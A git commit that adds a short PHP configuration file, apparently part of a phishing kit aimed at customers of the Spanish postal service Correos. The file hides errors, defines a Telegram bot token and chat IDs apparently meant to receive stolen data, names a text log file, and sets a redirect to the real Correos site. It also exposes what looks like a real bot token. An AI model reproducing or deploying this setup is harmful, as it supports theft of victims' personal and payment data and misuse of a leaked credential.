3fb29d4b842945189f460b7f16f009cdfcd5d6f6
samisofyan <114874300+samisofyan@users.noreply.github.com>
2022-12-01 11:43:43 +0100

    Y

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5918113355:AAFsdUjeSdTYJ9c1o8KMXaD1IZNGBM1FnFo");
+define("TELEGRAM_CHAT_ID", "841985483");
+define("TELEGRAM_CHAT_IDD", "-841985483");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
